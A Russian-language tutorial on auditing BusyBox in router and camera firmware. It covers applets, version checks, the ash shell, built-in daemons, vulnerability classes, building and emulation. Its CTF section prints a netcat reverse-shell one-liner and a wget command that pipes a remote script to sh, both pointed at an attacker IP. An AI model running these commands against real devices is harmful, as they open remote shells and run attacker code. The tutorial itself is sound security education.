**BusyBox** — «швейцарский нож» встраиваемого Linux: один статический бинарник, который через симлинки предоставляет сотни команд (`ls`, `cat`, `ifconfig`, `httpd`, `ash` и т.д.). В типичной прошивке роутера или камеры почти вся «пользовательская» обвязка — это BusyBox. Для пентестера он важен и как источник функциональности (встроенный `httpd`, `telnetd`, `ash`), и как цель (историю CVE никто не отменял). Этот урок — про то, как читать BusyBox и находить в нём слабости.

## Что такое applets

BusyBox определяет поведение по **argv[0]**: если бинарник запущен как `ls`, он выполняет код `ls`. Поэтому в rootfs сотни симлинков указывают на один `/bin/busybox`.

```bash
# В распакованном rootfs
ls -l bin/ls bin/cat bin/sh
# lrwxrwxrwx ... bin/ls -> /bin/busybox
# lrwxrwxrwx ... bin/cat -> /bin/busybox
# lrwxrwxrwx ... bin/sh -> /bin/busybox

# Список всех applets
./bin/busybox --list
# или
strings bin/busybox | grep -A2 'BusyBox v'
./bin/busybox
# BusyBox v1.35.0 (2022-01-01) multi-call binary.
# ...
# Currently defined functions:
#   [, [[, ash, cat, chmod, cp, ...
```

Список applets — это фактически «какие команды есть в системе». Если нужной команды нет, её роль часто играет другой applet (`ip` вместо `ifconfig`, `wget` вместо `curl`).

## Версия и конфигурация

Версия BusyBox печатается при запуске без аргументов или через `--help`. Она критична: старые версии содержат известные CVE (например, в `ash`, в разборе DHCP, в `wget`). В бинарнике можно найти строку версии:

```bash
strings bin/busybox | grep -iE 'BusyBox v[0-9]'
# BusyBox v1.19.4 (2014-...)
```

Компилируется BusyBox из `.config`; если производитель выложил исходники (GPL), там будет точный список включённых applets и патчи. Часто в прошивке есть `busybox.config` или исходники рядом.

## ash и shell-скрипты

`ash` — облегчённый POSIX-shell, который BusyBox предоставляет как `/bin/sh`. Он поддерживает не всё, что bash: нет `[[ ]]` в полном объёме, арифметика ограничена, `$(...)` есть. Для анализа скриптов инициализации это важно — синтаксис «проще».

```bash
# Проверить, что sh — это busybox
/bin/sh --help 2>&1 | head
readlink -f /bin/sh
```

Опасность: `ash` исторически имел уязвимости (например, обработка переменных окружения, переполнения при разборе). Если на устройстве есть способ передать данные в shell (CGI, `system()` в демонах), уязвимость ash может дать RCE.

## Встроенные сетевые сервисы

BusyBox включает мини-демоны, которые часто включены в прошивках:

| Applet | Назначение | Риск |
|--------|-----------|------|
| `httpd` | веб-сервер | отдача файлов, CGI |
| `telnetd` | telnet-демон | открытый shell без шифрования |
| `ftpd` | FTP | анонимный доступ |
| `udhcpd` | DHCP-сервер | подмена сети |
| `wget` | загрузка | SSRF, загрузка payload |
| `nc` | netcat | реверс-шелл |
| `crond` | cron | скрытая периодическая задача |

Если в прошивке есть `telnetd`, запущенный без пароля, — это мгновенный root. Проверяйте `ps`/`/etc/init.d` на предмет этих демонов.

## Разобранный пример: аудит BusyBox в прошивке

```bash
# 1. Найти busybox и его версию
find rootfs -name busybox -type f
strings rootfs/bin/busybox | grep -m1 'BusyBox v'
# BusyBox v1.19.4
# 2. Список applets
rootfs/bin/busybox --list | tr '\n' ' '
# 3. Проверить, есть ли опасные демоны
rootfs/bin/busybox --list | grep -E 'telnetd|httpd|ftpd|nc'
# 4. Посмотреть, кто запускает их при загрузке
grep -rE 'telnetd|httpd|ftpd' rootfs/etc/ | head
# 5. Проверить CGI
ls rootfs/www/cgi-bin 2>/dev/null
file rootfs/www/cgi-bin/* 2>/dev/null
```

Версия 1.19.4 (2014) имеет известные уязвимости — это сразу кандидат на эксплуатацию, если демон доступен по сети.

## Известные уязвимости и классы

- **Переполнения в applets** — `ash`, `wget`, разбор DHCP/ARP.
- **CGI-инъекции** — BusyBox `httpd` вызывает CGI через shell; неэкранированные параметры дают command injection.
- **Неправильные права** — `httpd` с доступом к `/` отдаёт всю ФС.
- **`telnetd` без пароля** — прямой root.
- **Path traversal** в `httpd` (старые версии).

```bash
# Проверить версию против базы CVE
searchsploit busybox | head
```

## Частые ошибки и подводные камни

- **Флаги отличаются**: BusyBox-команды урезаны; `ls -Z`, `cp -a` могут отсутствовать.
- **`readlink` не решает симлинки рекурсивно** без флага.
- **Статический бинарник**: не требует libc, но и не покажет зависимости.
- **Разные версии в одной прошивке**: бывает несколько busybox.
- **`--list` может не работать** в очень старых сборках — тогда `strings`.

## Сборка BusyBox и кастомизация

Понимание сборки помогает читать прошивки: производители часто патчат BusyBox, убирая «опасные» applets или добавляя свои. Собрать BusyBox можно так:

```bash
git clone https://git.busybox.net/busybox
cd busybox
make defconfig            # дефолтная конфигурация
make menuconfig           # выбрать applets, static, ash
make CROSS_COMPILE=arm-linux-gnueabi- -j8
```

Ключевые опции: `CONFIG_STATIC` (статический бинарник), `CONFIG_ASH` (shell), `CONFIG_HTTPD`, `CONFIG_TELNETD`, `CONFIG_FEATURE_*`. Если у вас есть `.config` производителя (иногда лежит в исходниках), вы точно знаете, какие applets включены. Патчи производителя ищите в diff к апстриму — там могут быть скрытые команды и «сервисные» учётки.

## BusyBox в CTF: практические приёмы

В CTF-задачах BusyBox встречается постоянно:

- **Проверка версии** через `strings` и `--list` — быстрый способ понять возможности системы.
- **Встроенный `nc`** — если он есть, можно сделать реверс-шелл одной строкой.
- **`wget`** — загрузка payload без curl.
- **`httpd -h /`** — если запущен так, отдаёт всю ФС; ищите флаги в `/www` или через traversal.
- **`ash`** — цель для инъекций, если входные данные попадают в shell.

```bash
# Типичный реверс-шелл на busybox
nc 10.10.14.1 4444 -e /bin/sh
# Загрузка скрипта
wget -qO- http://10.10.14.1/a.sh | sh
```

Помните, что флаги урезаны: не все опции `nc`/`wget` поддерживаются, а `-e` для `nc` требует сборки с `CONFIG_NC_EXTRA`.

## Toybox и альтернативы

**Toybox** — современная замена BusyBox от бывшего мейнтейнера (Rob Landley), используется в Android. **Coreutils** — полные версии в десктопном Linux. Во встраиваемых системах вы можете встретить:

| Набор | Особенности |
|-------|-------------|
| BusyBox | самый распространённый, GPLv2 |
| Toybox | BSD-лицензия, используется в Android |
| coreutils | полный набор, большой размер |
| sbase/ubase | минималистичные, suckless |

Если в прошивке Android-подобная система, ищите `toybox`; если классический роутер — `busybox`. Определить можно по `--list` и по строке версии в бинарнике.

## Отладка и запуск в эмуляции

BusyBox удобно запускать локально для проверки поведения applet'ов:

```bash
# Скачать статический busybox нужной архитектуры
# Запустить applet из чужой прошивки (если архитектура совпадает)
qemu-arm -L /usr/arm-linux-gnueabi ./busybox ls
qemu-arm ./busybox ash
# Проверить, какие опции поддерживает applet
./busybox wget --help
```

Если архитектура не совпадает, используйте `qemu-user` с подходящим sysroot. Для статических бинарников это обычно работает «из коробки», для динамических нужен правильный `ld.so`. Отладка applet'ов в Ghidra/radare2 требует символов, но BusyBox часто собран stripped — тогда опирайтесь на строки (сообщения об ошибках) и известную версию. Сравнение с исходниками апстрима той же версии сильно ускоряет реверс: вы знаете, как выглядит нормальный код, и ищете отличия.
